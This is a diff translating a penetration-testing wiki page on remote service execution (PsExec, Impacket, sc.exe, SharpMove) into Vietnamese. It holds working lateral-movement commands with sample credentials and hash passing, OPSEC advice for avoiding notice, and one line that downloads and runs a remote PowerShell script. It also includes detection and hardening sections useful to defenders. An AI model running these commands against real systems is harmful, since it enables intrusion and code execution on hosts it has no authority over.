@@ -1,28 +1,28 @@
-# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)
+# Thực thi dịch vụ từ xa (PsExec, WinExec, ScExec, SMBExec, SCMExec)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## How do they work
+## Cách chúng hoạt động
 
-These techniques abuse the Windows Service Control Manager (SCM) remotely over SMB/RPC to execute commands on a target host. The Service Control Manager Remote Protocol (SCMR) is the RPC-based interface for configuring and controlling Windows services on a remote computer. With sufficient permissions, an operator can create or reconfigure a service whose binary path contains a command and then start that service to execute it remotely.<sup>[[5]](#references)</sup> The common flow is:
+Các kỹ thuật này lạm dụng Windows Service Control Manager (SCM) từ xa qua SMB/RPC để thực thi lệnh trên máy chủ mục tiêu. Service Control Manager Remote Protocol (SCMR) là giao diện dựa trên RPC để cấu hình và điều khiển các dịch vụ Windows trên máy tính từ xa. Với đủ quyền, operator có thể tạo hoặc cấu hình lại một dịch vụ có đường dẫn binary chứa lệnh, rồi khởi chạy dịch vụ đó để thực thi lệnh từ xa.<sup>[[5]](#references)</sup> Quy trình phổ biến gồm:
 
-1. Authenticate to the target over SMB/RPC (TCP/445); access the ADMIN$ share when the chosen variant needs to stage a file or retrieve output there.
-2. Copy an executable or specify a LOLBAS command line that the service will run.
-3. Create a service remotely via SCM (MS-SCMR over \PIPE\svcctl) pointing to that command or binary.
-4. Start the service to execute the payload and optionally capture stdin/stdout via a named pipe.
-5. Stop the service and clean up (delete the service and any dropped binaries).
+1. Xác thực với mục tiêu qua SMB/RPC (TCP/445); truy cập share ADMIN$ nếu biến thể được chọn cần đưa file lên hoặc lấy output từ đó.
+2. Sao chép một executable hoặc chỉ định dòng lệnh LOLBAS để dịch vụ chạy.
+3. Tạo dịch vụ từ xa qua SCM (MS-SCMR qua \PIPE\svcctl), trỏ đến lệnh hoặc binary đó.
+4. Khởi chạy dịch vụ để thực thi payload và tùy chọn thu thập stdin/stdout qua named pipe.
+5. Dừng dịch vụ và dọn dẹp (xóa dịch vụ cùng mọi binary đã thả xuống).
 
-Requirements/prereqs:
-- Local Administrator on the target (SeCreateServicePrivilege) or explicit service creation rights on the target.
-- SMB (445) reachable and Remote Service Management allowed through the host firewall; ADMIN$ must be available for variants that use it to stage a file or retrieve output.
-- UAC Remote Restrictions: with local accounts, token filtering may block admin over the network unless using the built-in Administrator or LocalAccountTokenFilterPolicy=1.
-- Kerberos vs NTLM: using a hostname/FQDN enables Kerberos; connecting by IP often falls back to NTLM (and may be blocked in hardened environments).
+Yêu cầu/điều kiện tiên quyết:
+- Có quyền Local Administrator trên mục tiêu (SeCreateServicePrivilege) hoặc có quyền tạo dịch vụ tường minh trên mục tiêu.
+- SMB (445) có thể truy cập và Remote Service Management được cho phép qua firewall của máy chủ; ADMIN$ phải khả dụng với các biến thể cần dùng share này để đưa file lên hoặc lấy output.
+- UAC Remote Restrictions: với tài khoản cục bộ, việc lọc token có thể chặn quyền admin qua mạng, trừ khi sử dụng tài khoản Administrator tích hợp sẵn hoặc đặt LocalAccountTokenFilterPolicy=1.
+- Kerberos và NTLM: dùng hostname/FQDN sẽ bật Kerberos; kết nối bằng IP thường sẽ chuyển sang NTLM (và có thể bị chặn trong môi trường được hardening).
 
-If no service account is specified, `CreateService` uses `LocalSystem`, which has extensive local privileges. This explains the high impact of successful SCM execution. It does not inherently disable UAC or Microsoft Defender: the caller still needs remote SCM rights, and endpoint controls can inspect or block the service or payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
+Nếu không chỉ định tài khoản dịch vụ, `CreateService` sẽ sử dụng `LocalSystem`, tài khoản này có nhiều quyền cục bộ. Điều này lý giải mức độ ảnh hưởng cao khi thực thi SCM thành công. Cơ chế này không tự vô hiệu hóa UAC hay Microsoft Defender: bên gọi vẫn cần có quyền SCM từ xa, và các biện pháp kiểm soát endpoint có thể kiểm tra hoặc chặn dịch vụ hay payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
 
-### Manual ScExec/WinExec via sc.exe
+### ScExec/WinExec thủ công qua sc.exe
 
-The following shows a minimal service-creation approach. The service image can be a dropped EXE or a LOLBAS like cmd.exe or powershell.exe.
+Phần sau trình bày cách tạo dịch vụ tối giản. Image của dịch vụ có thể là một EXE được thả xuống hoặc một LOLBAS như cmd.exe hay powershell.exe.
 
 ```cmd
 :: Execute a one-liner without dropping a binary
@@ -37,18 +37,18 @@ sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
 
-Notes:
-- Expect a timeout error when starting a non-service EXE; execution still happens.
-- To remain more OPSEC-friendly, prefer fileless commands (cmd /c, powershell -enc) or delete dropped artifacts.
+Ghi chú:
+- Dự kiến gặp lỗi timeout khi khởi chạy EXE không phải service; quá trình thực thi vẫn diễn ra.
+- Để thân thiện hơn với OPSEC, ưu tiên các lệnh fileless (`cmd /c`, `powershell -enc`) hoặc xóa các artifact đã thả xuống.
 
-Find more detailed steps in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
+Tìm các bước chi tiết hơn tại: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
-## Tooling and examples
+## Công cụ và ví dụ
 
 ### Sysinternals PsExec.exe
 
-- Classic admin tool that uses SMB to drop PSEXESVC.exe in ADMIN$, installs a temporary service (default name PSEXESVC), and proxies I/O over named pipes.
-- Example usages:<sup>[[1]](#references)</sup>
+- Công cụ quản trị kinh điển sử dụng SMB để thả PSEXESVC.exe vào ADMIN$, cài đặt một service tạm thời (tên mặc định là PSEXESVC) và chuyển tiếp I/O qua named pipes.
+- Ví dụ sử dụng:<sup>[[1]](#references)</sup>
 
 ```cmd
 :: Interactive SYSTEM shell on remote host
@@ -61,18 +61,18 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
 
-- You can launch directly from Sysinternals Live via WebDAV:
+- Bạn có thể khởi chạy trực tiếp từ Sysinternals Live qua WebDAV:
 
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
 
 OPSEC
-- Leaves service install/uninstall events (Service name often PSEXESVC unless -r is used) and creates C:\Windows\PSEXESVC.exe during execution.
+- Để lại các sự kiện cài đặt/gỡ cài đặt service (tên service thường là PSEXESVC trừ khi dùng -r) và tạo C:\Windows\PSEXESVC.exe trong quá trình thực thi.
 
-### Impacket psexec.py (PsExec-like)
+### Impacket psexec.py (tương tự PsExec)
 
-- Uses an embedded RemCom-like service. Drops a transient service binary (commonly randomized name) via ADMIN$, creates a service (default often RemComSvc), and proxies I/O over a named pipe.
+- Sử dụng service kiểu RemCom được nhúng sẵn. Thả một binary service tạm thời (thường có tên ngẫu nhiên) qua ADMIN$, tạo một service (mặc định thường là RemComSvc) và proxy I/O qua một named pipe.
 
 ```bash
 # Password auth
@@ -88,7 +88,7 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
 
-On Kali, the Impacket examples may be located under `/usr/share/doc/python3-impacket/examples/`. If no password is provided, the tool prompts for one. Impacket's `-k` requests Kerberos authentication instead of NTLM, usually using the current credential cache or supplied credentials.
+Trên Kali, các ví dụ của Impacket có thể nằm trong `/usr/share/doc/python3-impacket/examples/`. Nếu không cung cấp mật khẩu, công cụ sẽ yêu cầu nhập mật khẩu. Tùy chọn `-k` của Impacket yêu cầu xác thực Kerberos thay vì NTLM, thường sử dụng bộ nhớ đệm thông tin xác thực hiện tại hoặc thông tin xác thực được cung cấp.
 
 ```bash
 #If no password is provided, it will be prompted
@@ -98,12 +98,12 @@ psexec \\192.168.122.66 -u Administrator -p 123456Ww
 psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
 ```
 
-Artifacts
-- Temporary EXE in C:\Windows\ (random 8 chars). Service name defaults to RemComSvc unless overridden.
+Dấu vết
+- EXE tạm thời trong C:\Windows\ (8 ký tự ngẫu nhiên). Tên service mặc định là RemComSvc, trừ khi được ghi đè.
 
 ### Impacket smbexec.py (SMBExec)
 
-- Creates a temporary service that spawns cmd.exe and uses a named pipe for I/O. Generally avoids dropping a full EXE payload; command execution is semi-interactive.
+- Tạo một service tạm thời để khởi chạy cmd.exe và dùng named pipe cho I/O. Thường không cần thả payload EXE đầy đủ; việc thực thi lệnh có tính tương tác bán phần.
 
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
@@ -112,68 +112,68 @@ smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 
 ### SharpLateral and SharpMove
 
-- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implements several lateral movement methods including service-based exec.
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) triển khai một số phương thức di chuyển ngang, bao gồm service-based exec.
 
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
 
-- [SharpMove](https://github.com/0xthirteen/SharpMove) supports authenticated remote execution through SCM and several other Windows mechanisms, including service modification/creation.
+- [SharpMove](https://github.com/0xthirteen/SharpMove) hỗ trợ thực thi từ xa có xác thực thông qua SCM và một số cơ chế Windows khác, bao gồm sửa đổi/tạo dịch vụ.
 
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
 
-- You can also use CrackMapExec to execute via different backends (psexec/smbexec/wmiexec):
+- Bạn cũng có thể dùng CrackMapExec để thực thi thông qua các backend khác nhau (psexec/smbexec/wmiexec):
 
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
 
-#### SCMExec with SharpMove
+#### SCMExec với SharpMove
 
-The SCM action creates a service named `WindowsDebug` and points it at a payload already present on the remote host.<sup>[[6]](#references)</sup>
+Hành động SCM tạo một service có tên `WindowsDebug` và trỏ service này đến payload đã có sẵn trên host từ xa.<sup>[[6]](#references)</sup>
 
 ```powershell
 SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
 ```
 
-## OPSEC, detection and artifacts
+## OPSEC, phát hiện và dấu vết
 
-Typical host/network artifacts when using PsExec-like techniques:
-- Security 4624 (Logon Type 3) and 4672 (Special Privileges) on target for the admin account used.
-- Security 5140/5145 File Share and File Share Detailed events showing ADMIN$ access and create/write of service binaries (e.g., PSEXESVC.exe or random 8-char .exe).
-- **System** 7045 from Service Control Manager for service installation on the target: names like PSEXESVC, RemComSvc, or custom (`-r` / `-service-name`). This proves a service was installed, not that its image ran. Correlate its timestamp and image path with process events or a matching service-image prefetch entry when available.<sup>[[4]](#references)</sup>
-- Sysmon 1 (Process Create) for services.exe or the service image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) for pipes such as \\.\pipe\psexesvc, \\.\pipe\remcom_*, or randomized equivalents.
-- Registry artifact for Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 on the operator host (if not suppressed).
+Các dấu vết thường gặp trên máy chủ/mạng khi sử dụng kỹ thuật kiểu PsExec:
+- Security 4624 (Logon Type 3) và 4672 (Special Privileges) trên máy đích cho tài khoản admin được sử dụng.
+- Các sự kiện Security 5140/5145 File Share và File Share Detailed cho thấy truy cập ADMIN$ và tạo/ghi các tệp binary dịch vụ (ví dụ: PSEXESVC.exe hoặc .exe ngẫu nhiên gồm 8 ký tự).
+- **System** 7045 từ Service Control Manager khi cài đặt dịch vụ trên máy đích: các tên như PSEXESVC, RemComSvc hoặc tên tùy chỉnh (`-r` / `-service-name`). Sự kiện này chứng minh dịch vụ đã được cài đặt, không chứng minh image của dịch vụ đã chạy. Đối chiếu dấu thời gian và đường dẫn image với sự kiện tiến trình hoặc mục prefetch tương ứng với image dịch vụ, nếu có.<sup>[[4]](#references)</sup>
+- Sysmon 1 (Process Create) cho services.exe hoặc image dịch vụ, 3 (Network Connect), 11 (File Create) trong C:\Windows\, 17/18 (Pipe Created/Connected) cho các pipe như \\.\pipe\psexesvc, \\.\pipe\remcom_* hoặc các tên tương đương được tạo ngẫu nhiên.
+- Dấu vết Registry của EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 trên máy của operator (nếu không bị tắt).
 
-Hunting ideas
-- Alert on service installs where the ImagePath includes cmd.exe /c, powershell.exe, or TEMP locations.
-- Look for process creations where ParentImage is C:\Windows\PSEXESVC.exe or children of services.exe running as LOCAL SYSTEM executing shells.
-- Flag named pipes ending with -stdin/-stdout/-stderr or well-known PsExec clone pipe names.
+Ý tưởng săn tìm
+- Cảnh báo khi cài đặt dịch vụ có ImagePath chứa cmd.exe /c, powershell.exe hoặc các vị trí TEMP.
+- Tìm các lần tạo tiến trình có ParentImage là C:\Windows\PSEXESVC.exe hoặc tiến trình con của services.exe chạy với quyền LOCAL SYSTEM để thực thi shell.
+- Đánh dấu các named pipe có tên kết thúc bằng -stdin/-stdout/-stderr hoặc tên pipe quen thuộc của các bản sao PsExec.
 
-## Troubleshooting common failures
-- Access is denied (5) when creating services: not truly local admin, UAC remote restrictions for local accounts, or EDR tampering protection on the service binary path.
-- The network path was not found (53) or could not connect to ADMIN$: firewall blocking SMB/RPC or admin shares disabled.
-- Kerberos fails but NTLM is blocked: connect using hostname/FQDN (not IP), ensure proper SPNs, or supply -k/-no-pass with tickets when using Impacket.
-- Service start times out but payload ran: expected if not a real service binary; capture output to a file or use smbexec for live I/O.
+## Khắc phục các lỗi thường gặp
+- Access is denied (5) khi tạo dịch vụ: tài khoản không thực sự là admin cục bộ, giới hạn UAC từ xa đối với tài khoản cục bộ hoặc tính năng chống can thiệp của EDR trên đường dẫn binary dịch vụ.
+- The network path was not found (53) hoặc không thể kết nối tới ADMIN$: firewall chặn SMB/RPC hoặc các admin share đã bị tắt.
+- Kerberos thất bại nhưng NTLM bị chặn: kết nối bằng hostname/FQDN (không dùng IP), đảm bảo SPN phù hợp hoặc cung cấp -k/-no-pass cùng tickets khi dùng Impacket.
+- Dịch vụ hết thời gian chờ khi khởi động nhưng payload đã chạy: điều này có thể xảy ra nếu không dùng binary dịch vụ thật; ghi output vào tệp hoặc dùng smbexec để có I/O trực tiếp.
 
-## Hardening notes
-- Windows 11 24H2 and Windows Server 2025 require SMB signing by default for outbound (and Windows 11 inbound) connections. This does not break legitimate PsExec usage with valid creds but prevents unsigned SMB relay abuse and may impact devices that don’t support signing.<sup>[[2]](#references)</sup>
-- New SMB client NTLM blocking (Windows 11 24H2/Server 2025) can prevent NTLM fallback when connecting by IP or to non-Kerberos servers. In hardened environments this will break NTLM-based PsExec/SMBExec; use Kerberos (hostname/FQDN) or configure exceptions if legitimately needed.<sup>[[2]](#references)</sup>
-- Principle of least privilege: minimize local admin membership, prefer Just-in-Time/Just-Enough Admin, enforce LAPS, and monitor/alert on 7045 service installs.
+## Lưu ý về hardening
+- Windows 11 24H2 và Windows Server 2025 mặc định yêu cầu SMB signing cho kết nối đi (và kết nối đến trên Windows 11). Điều này không ảnh hưởng đến việc sử dụng PsExec hợp lệ với thông tin xác thực hợp lệ, nhưng ngăn chặn lạm dụng SMB relay không ký và có thể ảnh hưởng đến các thiết bị không hỗ trợ signing.<sup>[[2]](#references)</sup>
+- Tính năng chặn NTLM mới của SMB client (Windows 11 24H2/Server 2025) có thể ngăn fallback sang NTLM khi kết nối bằng IP hoặc đến máy chủ không dùng Kerberos. Trong môi trường đã harden, điều này sẽ làm hỏng PsExec/SMBExec dựa trên NTLM; hãy dùng Kerberos (hostname/FQDN) hoặc cấu hình ngoại lệ nếu thực sự cần.<sup>[[2]](#references)</sup>
+- Nguyên tắc đặc quyền tối thiểu: giảm số thành viên trong nhóm admin cục bộ, ưu tiên Just-in-Time/Just-Enough Admin, triển khai LAPS và giám sát/cảnh báo khi cài đặt dịch vụ 7045.
 
-## See also
+## Xem thêm
 
-- WMI-based remote exec (often more fileless):
+- Thực thi từ xa dựa trên WMI (thường ít để lại tệp hơn):
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRM-based remote exec:
+- Thực thi từ xa dựa trên WinRM:
 
 {{#ref}}
 ./winrm.md
@@ -182,12 +182,11 @@ Hunting ideas
 ## References
 
 - [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
-- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
-- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-- [4] [Microsoft – Troubleshoot unexpected reboots using system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
-- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol overview](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
+- [2] [Tăng cường bảo mật SMB trong Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Dùng thông tin xác thực để chiếm quyền các máy Windows - Phần 2 (PSExec và dịch vụ)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+- [4] [Microsoft – Khắc phục sự cố khởi động lại bất ngờ bằng nhật ký sự kiện hệ thống](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
+- [5] [Microsoft Open Specifications - Tổng quan về giao thức từ xa Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
 - [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
-- [7] [Microsoft Learn - LocalSystem account](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
-- [8] [Microsoft Learn - `CreateService` function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
-
+- [7] [Microsoft Learn - Tài khoản LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
+- [8] [Microsoft Learn - Hàm `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
 {{#include ../../banners/hacktricks-training.md}}
